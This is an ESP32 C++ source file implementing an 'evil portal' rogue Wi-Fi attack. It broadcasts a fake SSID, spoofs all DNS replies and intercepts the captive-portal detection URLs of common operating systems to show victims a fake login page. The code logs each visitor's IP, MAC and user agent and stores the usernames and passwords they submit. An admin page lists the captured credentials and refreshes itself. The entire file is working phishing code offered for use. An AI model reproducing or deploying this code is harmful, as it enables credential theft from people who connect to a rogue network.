/**
 * evil_portal.cpp — Captive Portal (Shared Server Architecture)
 * --------------------------------------------------------------
 * The portal borrows the main WebUI's WebServer instead of creating
 * its own. This means:
 *
 * - AP stays online as the fake SSID (just renamed, never disconnected)
 * - Dashboard stays fully functional — all /cmd, /state, /wifi_data etc. work
 * - Portal runs on port 80 of the same server
 * - Victim goes to 192.168.4.1/ → sees portal
 * - Attacker goes to 192.168.4.1/ep_admin → sees captures
 * - Dashboard JS app still loads at 192.168.4.1/dashboard
 *
 * Route layout while portal is active:
 *   /                      → portal login page   (overrides dashboard root)
 *   /ep_login   POST       → credential capture
 *   /ep_success            → "thank you" page
 *   /ep_admin              → admin view (all captures)
 *   /hotspot-detect.html   → redirect to /
 *   /generate_204          → redirect to /
 *   ... (all other captive detection endpoints)
 *   /dashboard             → full ESP32 dashboard (permanent alias)
 *   /state, /cmd etc       → unchanged — dashboard API still works
 */
#include "evil_portal.h"
#include <esp_wifi.h>
extern CyberStorage cyberStorage;

// ── MAC lookup ───────────────────────────────────────────────────────────────
String EvilPortal::_getMacForIP(const String& ip) {
  wifi_sta_list_t sta;
  memset(&sta, 0, sizeof(sta));
  if(esp_wifi_ap_get_sta_list(&sta) != ESP_OK || sta.num == 0) return "unknown";
  int dot = ip.lastIndexOf('.');
  if(dot < 0) return "unknown";
  int idx = ip.substring(dot + 1).toInt() - 2;
  uint8_t* m = nullptr;
  if(idx >= 0 && idx < (int)sta.num)          m = sta.sta[idx].mac;
  else if(sta.num == 1)                        m = sta.sta[0].mac;
  if(!m) return "unknown";
  char buf[18];
  snprintf(buf,18,"%02X:%02X:%02X:%02X:%02X:%02X",m[0],m[1],m[2],m[3],m[4],m[5]);
  return String(buf);
}

// ── Connection logger ────────────────────────────────────────────────────────
void EvilPortal::_logVisit() {
  if(!_srv) return;
  String ip  = _srv->client().remoteIP().toString();
  String ua  = _srv->hasHeader("User-Agent") ? _srv->header("User-Agent") : "unknown";
  for(int i=0;i<_connCount;i++) if(_conns[i].ip==ip) return;
  if(_connCount < MAX_EP_CONNS) {
    String mac = _getMacForIP(ip);
    _conns[_connCount++] = {ip, mac, ua, millis()};
    Serial.printf("EP: connect %s  MAC:%s\n", ip.c_str(), mac.c_str());
  }
}

// ── Portal page ──────────────────────────────────────────────────────────────
void EvilPortal::_handlePortalRoot() {
  _logVisit();
  _srv->send_P(200, "text/html", EP_TEMPLATES[_tplId]);
}

// ── Captive portal detection intercept ──────────────────────────────────────
void EvilPortal::_handleCaptiveRedirect() {
  _logVisit();
  _srv->sendHeader("Location", "http://192.168.4.1/", true);
  _srv->sendHeader("Cache-Control", "no-cache");
  _srv->send(302, "text/plain", "");
}

// ── Credential capture ───────────────────────────────────────────────────────
void EvilPortal::_handlePortalLogin() {
  String user = _srv->hasArg("user") ? _srv->arg("user") : "";
  String pass = _srv->hasArg("pass") ? _srv->arg("pass") : "";
  String ip   = _srv->client().remoteIP().toString();
  String ua   = _srv->hasHeader("User-Agent") ? _srv->header("User-Agent") : "unknown";
  String mac  = _getMacForIP(ip);
  _logVisit();

  Serial.printf("EP CRED: %s / %s  IP:%s  MAC:%s\n",
                user.c_str(), pass.c_str(), ip.c_str(), mac.c_str());

  if(_credCount < MAX_EP_CREDS && (user.length() || pass.length())) {
    _creds[_credCount++] = {user, pass, ip, mac, ua, "", millis()};
    cyberStorage.saveCred("portal", _currentSSID, user, pass, ip);
  }
  _srv->sendHeader("Location", "/ep_success", true);
  _srv->send(302, "text/plain", "");
}

void EvilPortal::_handlePortalSuccess() {
  _srv->send_P(200, "text/html", EP_OK);
}

// ── Admin page ───────────────────────────────────────────────────────────────
void EvilPortal::_handlePortalAdmin() {
  String h = "<!DOCTYPE html><html><head>"
    "<meta charset='utf-8'><meta name='viewport' content='width=device-width,initial-scale=1'>"
    "<meta http-equiv='refresh' content='5'>"  // auto-refresh every 5s
    "<title>EP Admin</title>"
    "<style>*{box-sizing:border-box}body{background:#111;color:#eee;"
    "font-family:monospace;padding:16px;max-width:900px;margin:0 auto}"
    "h2{color:#ff6b35}h3{color:#aaa;font-size:.9rem;margin:16px 0 6px}"
    "table{width:100%;border-collapse:collapse;font-size:.82rem}"
    "th{color:#555;text-align:left;padding:5px 8px;border-bottom:2px solid #333}"
    "td{padding:5px 8px;border-bottom:1px solid #222;word-break:break-all}"
    ".mac{color:#4fc3f7}.u{color:#a5d6a7}.p{color:#ef9a9a}.dim{color:#555}"
    ".badge{background:#ff6b35;color:#fff;padding:2px 6px;border-radius:3px;font-size:.75rem}"
    "</style></head><body>";

  h += "<h2>&#128274; Evil Portal Admin</h2>";
  h += "<p class='dim'>AP: <b style='color:#ffd54f'>" + _currentSSID + "</b> &nbsp;|&nbsp; "
     + "<span class='badge'>" + String(_connCount) + " connections</span> &nbsp; "
     + "<span class='badge' style='background:#ef9a9a;color:#111'>"
     + String(_credCount) + " credentials</span>"
     + "&nbsp;&nbsp;<span class='dim' style='font-size:.75rem'>auto-refreshes every 5s</span></p>";

  // Dashboard link
  h += "<p><a href='/dashboard' style='color:#4fc3f7'>&#8592; Back to ESP32 Dashboard</a></p>";

  // Connections table
  h += "<h3>CONNECTED DEVICES (visited portal)</h3>";
  if(_connCount == 0) {
    h += "<p class='dim'>None yet — waiting for victims to connect</p>";
  } else {
    h += "<table><tr><th>IP</th><th>MAC</th><th>User-Agent</th></tr>";
    for(int i=0;i<_connCount;i++)
      h += "<tr><td>" + _conns[i].ip + "</td>"
           "<td class='mac'>" + _conns[i].mac + "</td>"
           "<td class='dim'>" + _conns[i].useragent.substring(0,70) + "</td></tr>";
    h += "</table>";
  }

  // Credentials table
  h += "<h3>CAPTURED CREDENTIALS</h3>";
  if(_credCount == 0) {
    h += "<p class='dim'>None yet — waiting for form submissions</p>";
  } else {
    h += "<table><tr><th>Username/Email</th><th>Password</th><th>IP</th><th>MAC</th></tr>";
    for(int i=0;i<_credCount;i++)
      h += "<tr><td class='u'>" + _creds[i].user + "</td>"
           "<td class='p'>" + _creds[i].pass + "</td>"
           "<td>" + _creds[i].ip + "</td>"
           "<td class='mac'>" + _creds[i].mac + "</td></tr>";
    h += "</table>";
  }

  h += "</body></html>";
  _srv->send(200, "text/html", h);
}

// ── begin() ──────────────────────────────────────────────────────────────────
bool EvilPortal::begin(int templateId, WebServer* mainServer) {
  if(!mainServer) return false;
  if(templateId < 0 || templateId >= EP_TEMPLATE_COUNT) templateId = 0;

  _tplId     = templateId;
  _credCount = 0;
  _connCount = 0;
  _srv       = mainServer;

  // Rename the AP to the fake SSID — dashboard stays up, just name changes
  const char* fakeSSID = EP_AP_NAMES[templateId];
  _currentSSID = String(fakeSSID);
  WiFi.softAP(fakeSSID, nullptr, 6, 0, 8);
  delay(300);

  IPAddress apIP = WiFi.softAPIP();
  Serial.printf("EP: AP renamed to '%s' at %s\n", fakeSSID, apIP.toString().c_str());

  // DNS spoof — all queries → our IP — triggers captive portal popup
  _dns.setErrorReplyCode(DNSReplyCode::NoError);
  _dns.start(53, "*", apIP);

  // Register portal routes on the MAIN server
  // These override or add to existing routes — dashboard routes unchanged
  _srv->on("/", HTTP_GET,
    [this](){ _handlePortalRoot(); });

  _srv->on("/ep_login", HTTP_POST,
    [this](){ _handlePortalLogin(); });

  _srv->on("/ep_success", HTTP_GET,
    [this](){ _handlePortalSuccess(); });

  _srv->on("/ep_admin", HTTP_GET,
    [this](){ _handlePortalAdmin(); });

  // Captive portal detection endpoints
  auto cap = [this](){ _handleCaptiveRedirect(); };
  _srv->on("/hotspot-detect.html",       HTTP_GET, cap);
  _srv->on("/library/test/success.html", HTTP_GET, cap);
  _srv->on("/success.html",              HTTP_GET, cap);
  _srv->on("/generate_204",              HTTP_GET, cap);
  _srv->on("/gen_204",                   HTTP_GET, cap);
  _srv->on("/connecttest.txt",           HTTP_GET, cap);
  _srv->on("/ncsi.txt",                  HTTP_GET, cap);
  _srv->on("/redirect",                  HTTP_GET, cap);
  _srv->on("/canonical.html",            HTTP_GET, cap);
  _srv->on("/chat",                      HTTP_GET, cap);
  _srv->on("/wpad.dat",                  HTTP_GET, cap);

  static const char* hdrs[] = {"User-Agent"};
  _srv->collectHeaders(hdrs, 1);

  _running = true;
  Serial.printf("EP: portal at http://%s/  admin: http://%s/ep_admin\n",
                apIP.toString().c_str(), apIP.toString().c_str());
  Serial.printf("EP: dashboard still at http://%s/dashboard\n",
                apIP.toString().c_str());
  return true;
}

// ── handle() ─────────────────────────────────────────────────────────────────
void EvilPortal::handle() {
  if(!_running) return;
  _dns.processNextRequest();
  // HTTP clients are handled by main WebUI loop — no need to call here
}

// ── stop() ───────────────────────────────────────────────────────────────────
void EvilPortal::stop() {
  _dns.stop();
  _running = false;
  _srv = nullptr;
  // Restore original AP name
  WiFi.softAP("ESP32-Cyber", "esp32cyber");
  delay(300);
  Serial.println("EP: stopped, AP restored to ESP32-Cyber");
}
